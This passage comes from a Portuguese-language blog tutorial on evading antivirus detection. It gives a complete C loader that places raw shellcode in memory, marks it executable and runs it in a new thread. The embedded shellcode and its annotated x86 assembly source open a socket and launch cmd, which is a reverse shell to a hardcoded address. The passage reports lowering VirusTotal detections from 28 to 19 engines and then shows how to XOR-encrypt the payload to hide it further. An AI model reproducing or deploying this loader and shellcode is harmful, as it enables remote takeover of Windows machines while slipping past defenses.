<code class="language-plaintext highlighter-rouge">DWORD</code> e aceita um único parâmetro do tipo <code class="language-plaintext highlighter-rouge">LPVOID</code>.<li><strong><code class="language-plaintext highlighter-rouge">lpParameter</code> (0)</strong>: Um ponteiro para o parâmetro que será passado para a função da <em>thread</em>. Passar <code class="language-plaintext highlighter-rouge">0</code> (ou <code class="language-plaintext highlighter-rouge">NULL</code>) significa que nenhum parâmetro específico está sendo passado.<li><strong><code class="language-plaintext highlighter-rouge">dwCreationFlags</code> (0)</strong>: <em>Flags</em> de criação da <em>thread</em>. Passar <code class="language-plaintext highlighter-rouge">0</code> faz com que a <em>thread</em> seja criada em estado de execução. Se <code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code> fosse passado, a <em>thread</em> seria criada, mas não iniciada até ser explicitamente retomada.<li><strong><code class="language-plaintext highlighter-rouge">lpThreadId</code> (0)</strong>: Um ponteiro para uma variável que receberá o identificador da nova <em>thread</em>. Passar <code class="language-plaintext highlighter-rouge">0</code> (ou <code class="language-plaintext highlighter-rouge">NULL</code>) significa que o identificador da <em>thread</em> não será armazenado.</ul><p>Em seguida, utilizaremos a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject</a> as APIs do Windows para esperar a execução da <em>thread</em>.</p><p>A função <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> espera que o objeto especificado seja sinalizado ou que o intervalo de tempo especificado expire. Ela tem a seguinte sintaxe:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">DWORD</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>  <span class="n">dwMilliseconds</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><strong><code class="language-plaintext highlighter-rouge">hHandle</code></strong>: Um manipulador para o objeto de sincronização. Neste caso, <code class="language-plaintext highlighter-rouge">thread</code> é o manipulador da thread criada anteriormente com <code class="language-plaintext highlighter-rouge">CreateThread</code>.<li><strong><code class="language-plaintext highlighter-rouge">dwMilliseconds</code></strong>: O intervalo de tempo, em milissegundos, pelo qual a função espera que o objeto seja sinalizado. Passar <code class="language-plaintext highlighter-rouge">-1</code> (ou <code class="language-plaintext highlighter-rouge">INFINITE</code>) faz com que a função espere indefinidamente até que o objeto seja sinalizado.</ul><p>Montando a função no código, temos a seguinte linha:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</pre></table></code></div></div><p>Portanto, a condição que montaremos no código fica da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
	<span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Uma vez com estas alterações, o código final deve estar da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x58\x10\x31\xd2\x68\x73\x73\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x4a\x20\x01\xd9\x89\x4d\xfc\x8b\x52\x1c\x01\xda\x31\xc0\x31\xc9\x89\xe6\x8b\x7d\xfc\x8b\x3c\x87\x01\xdf\x66\x83\xc1\x07\xf3\x66\xa7\x74\x03\x40\xe2\xe8\x83\xc0\x02\x8b\x3c\x82\x01\xdf\x89\xfd\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd5\x68\x33\x32\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc6\x68\x75\x70\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x66\xba\x90\x01\x29\xd4\x54\x52\xff\xd0\x68\x74\x41\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x52\x52\x52\xb2\x06\x52\x80\xea\x05\x52\x42\x52\xff\xd0\x50\x5f\x68\x65\x63\x74\x4e\x66\x83\x6c\x24\x03\x4e\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd5\xba\xc1\xa9\x48\x81\x81\xea\x01\x01\x01\x01\x52\x66\x68\x20\xfb\x31\xd2\xb2\x02\x66\x52\x89\xe2\x6a\x10\x52\x57\xff\xd0\x68\x73\x41\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd5\x89\xde\x68\x63\x6d\x64\x4e\x66\x83\x6c\x24\x03\x4e\x89\xe3\x57\x57\x57\x31\xff\x6a\x12\x59\x57\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\xc6\x44\x24\x10\x44\x8d\x4c\x24\x10\x54\x51\x57\x57\x57\x47\x57\x4f\x57\x57\x53\x57\xff\xd0\x68\x65\x73\x73\x4e\x66\x83\x6c\x24\x03\x4e\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x56\xff\xd5\x31\xc9\x51\xff\xd0</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

    <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="n">rx</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
        <span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724070902.png" alt="" /></p><p>Agora podemos compilar o programa, e submeter novamente no VirusTotal em sua forma atual.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724071103.png" alt="" /></p><ul><li><a href="https://www.virustotal.com/gui/file/03c4fc6d781f0dd6725b8df809bab0884b33bd92b59a2ee2e674288fa367e9fd/detection">https://www.virustotal.com/gui/file/03c4fc6d781f0dd6725b8df809bab0884b33bd92b59a2ee2e674288fa367e9fd/detection</a></ul><p>Abaixamos a identificação de ameaça de <strong>28</strong> para <strong>19</strong> antivírus somente com as implementações feitas. Foram simples implementações no código, que trouxeram simples resultados. A seguir continuaremos com mais alterações.</p><h2 id="ofuscando-o-shellcode">Ofuscando o <em>shellcode</em></h2><p>Por mais que nosso <em>shellcode</em> seja uma <em>string</em> de bytes, é muito fácil de ser interpretado por um AV ou até mesmo por alguém que faça engenharia reversa. Muitos antivírus tem a funcionalidade de ler as <em>strings hardcoded</em> no programa para identificar comportamento malicioso.</p><p>Para dificultar este processo, podemos criptografar nosso <em>shellcode</em> que está <em>hardcoded</em> no programa e descriptografá-lo em tempo de execução. Neste ponto, existe uma infinidade de técnicas e algoritmos que podemos usar, quanto melhor a eficácia da criptografia, mais difícil será a identificação do <em>shellcode</em>.</p><p>Por fins de simplicidade no exemplo, utilizaremos a <strong>XOR <em>encryption</em></strong>.</p><h3 id="xor-encryption">XOR <em>encryption</em></h3><p>A criptografia XOR (<em>Exclusive OR</em>) é um método simples de cifragem simétrica que usa a operação lógica XOR para encriptar e decriptar dados. A operação XOR é uma das operações lógicas básicas e funciona da seguinte maneira: para dois bits de entrada, se os bits forem iguais (ambos 0 ou ambos 1), o resultado é 0; se forem diferentes (um 0 e outro 1), o resultado é 1.</p><h4 id="princípios-básicos">Princípios Básicos</h4><p>A operação XOR é simbolizada pelo operador <code class="language-plaintext highlighter-rouge">^</code> em muitas linguagens de programação. Tabela verdade para a operação XOR:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>A | B | A XOR B
--+---+--------
0 | 0 |   0
0 | 1 |   1
1 | 0 |   1
1 | 1 |   0
</pre></table></code></div></div><blockquote><p>É por isso que a operação ASM <code class="language-plaintext highlighter-rouge">xor eax, eax</code> zera o registrador <code class="language-plaintext highlighter-rouge">EAX</code>, uma vez que o XOR é executado em bits iguais, o resultado sempre será 0.</p></blockquote><h4 id="encriptação">Encriptação</h4><p>Para encriptar um dado, você aplica a operação XOR entre cada bit do texto claro (mensagem original) e uma chave. A chave deve ter o mesmo tamanho ou ser repetida para cobrir o tamanho do texto claro.</p><p>Por exemplo, se o texto claro é “<strong>HELLO</strong>” e a chave é “<strong>XMCKL</strong>”, você converte ambos para seus valores binários, aplica a operação XOR em cada par de bits correspondente, e converte o resultado de volta para texto.</p><h4 id="decriptação">Decriptação</h4><p>O processo de decriptação é o mesmo que a encriptação: aplica-se a operação XOR entre o texto cifrado e a mesma chave usada para encriptar. A propriedade da operação XOR permite que, ao aplicar a mesma chave novamente, o texto claro original seja recuperado.</p><h4 id="exemplo-simples">Exemplo Simples</h4><p>Usaremos caracteres ASCII para ilustrar:</p><ul><li>Texto claro: “H” (ASCII 72) -&gt; 01001000<li>Chave: “K” (ASCII 75) -&gt; 01001011</ul><p>Encriptação:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>    01001000 (H)
XOR 01001011 (K)
    ---------
    00000011 (texto cifrado)
</pre></table></code></div></div><p>O texto cifrado é <code class="language-plaintext highlighter-rouge">00000011</code> (ASCII 3). Para decriptar:</p><p>Decriptação:</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>    00000011 (texto cifrado)
XOR 01001011 (K)
	---------
	01001000 (H)
</pre></table></code></div></div><p>Recuperamos o texto claro original “H”.</p><h4 id="segurança">Segurança</h4><p>A criptografia XOR é extremamente simples e, por si só, não é segura para a maioria das aplicações práticas, especialmente se a chave for reutilizada. Alguns pontos importantes:</p><ol><li><strong>Reutilização de Chaves</strong>: Se a mesma chave for reutilizada para diferentes textos claros, padrões podem ser descobertos e o texto claro pode ser recuperado.<li><strong>Chaves Longas</strong>: Para maior segurança, a chave deve ser tão longa quanto o texto claro e usada apenas uma vez (<em>One-Time Pad</em>). Quando a chave é completamente aleatória e usada apenas uma vez, a criptografia XOR é teoricamente inquebrável.<li><strong><em>Pseudorandomness</em></strong>: Em sistemas práticos, chaves pseudoaleatórias são usadas, mas isso pode introduzir fraquezas se o gerador de números pseudoaleatórios não for forte.</ol><h3 id="aplicando-xor-no-shellcode">Aplicando XOR no <em>shellcode</em></h3><p>Recapitulando o <em>shellcode</em> desenvolvido no <a href="https://h41stur.com/posts/shellcoding101/#shellcode-com-endere%C3%A7os-din%C3%A2micos">último artigo</a>, temos o seguinte código ASM:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

<span class="nl">getKernel32:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>

<span class="nl">getProcAddress:</span>

    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e4e7373</span>             <span class="c1">;movendo NNss para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
    <span class="nf">push</span> <span class="mh">0x65726464</span>             <span class="c1">;movendo erdd para stack</span>
    <span class="nf">push</span> <span class="mh">0x41636f72</span>             <span class="c1">;movendo Acor para stack</span>
    <span class="nf">push</span> <span class="mh">0x50746547</span>             <span class="c1">;movendo PteG para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 para obter o RVA da Export Name Pointer Table</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c para obter o RVA da Export Address Table</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table</span>

<span class="c1">;encontrando o endereço da GetrProcAddress na kernel32.dll com loop</span>
        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo GetrProcAddress da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">7</span>               <span class="c1">;movendo o comprimento da string GetrProcAddress para cx: GetProcAddress = 14 bytes = 7 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">eax</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>

    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>              <span class="c1">;aplicando a correção no contador de ebx</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;corrigindo o valor de edi</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicione o endereço base do kerneldll32 ao endereço acima para obter o endereço GetProcAddress</span>
    <span class="nf">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">edi</span>            <span class="c1">;carregando o endereço da GetProcAddress em ebp</span>

<span class="nl">loadLibraryA:</span>

	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>    <span class="c1">;zerando o registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>        <span class="c1">;enviando 0x0 como string terminator</span>
	<span class="nf">push</span> <span class="mh">0x41797261</span> <span class="c1">;enviando Ayra para stack</span>
	<span class="nf">push</span> <span class="mh">0x7262694c</span> <span class="c1">;enviando rbiL para Stack</span>
	<span class="nf">push</span> <span class="mh">0x64616f4c</span> <span class="c1">;enviando daoL para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;enviando ponteiro da string para stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">;enviando ponteiro da kernel32.dll para stack</span>
	<span class="nf">call</span> <span class="nb">ebp</span>        <span class="c1">;chamando GetProcAddress("kernel32.dll", "LoadLibraryA")</span>

<span class="nl">ws2_32:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e3233</span>              <span class="c1">;movendo NN32 para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x5f327377</span>              <span class="c1">;movendo _2sw para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro para string para a stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                     <span class="c1">;chamando LoadLibraryA(ws2_32)</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>                 <span class="c1">;salvando ponteiro para ws2_32 para uso recorrente</span>

<span class="nl">WSAStartup:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e7075</span>              <span class="c1">;movendo NNpu para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x74726174</span>              <span class="c1">;movendo trat para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "WSAStartup")</span>

<span class="nl">WSAStartupCall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0x190</span>   <span class="c1">;preparando espaço para WSADATA</span>
	<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;alocando o espaço para WSADATA</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;movendo ponteiro para este espaço</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;enviando o parametro wVersionRequested para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;chamando WSAStartup(MAKEWORD(2, 2), wsadata_pointer)</span>

<span class="nl">WSASocketA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4174</span>              <span class="c1">;movendo NNAt para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x656b636f</span>              <span class="c1">;movendo ekco para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "`WSASocketA")</span>

<span class="nl">WSASocketACall:</span>

	<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>    <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;dwFlags=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;g=NULL</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;lpProtocolInfo=NULL</span>
	<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x6</span>     <span class="c1">;edx==6</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;protocol=6</span>
	<span class="nf">sub</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x5</span>     <span class="c1">;edx==1</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;type=1</span>
	<span class="nf">inc</span> <span class="nb">edx</span>         <span class="c1">;edx==2</span>
	<span class="nf">push</span> <span class="nb">edx</span>        <span class="c1">;af=2</span>
	<span class="nf">call</span> <span class="nb">eax</span>        <span class="c1">;call WSASocketA</span>
	<span class="nf">push</span> <span class="nb">eax</span>        <span class="c1">;enviando retorno para stack</span>
	<span class="nf">pop</span> <span class="nb">edi</span>         <span class="c1">;salvando socket em edi</span>

<span class="nl">Connect:</span>

	<span class="nf">push</span> <span class="mh">0x4e746365</span>            <span class="c1">;movendo Ntce para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x6e6e6f63</span>            <span class="c1">;movendo nnoc para stack</span>
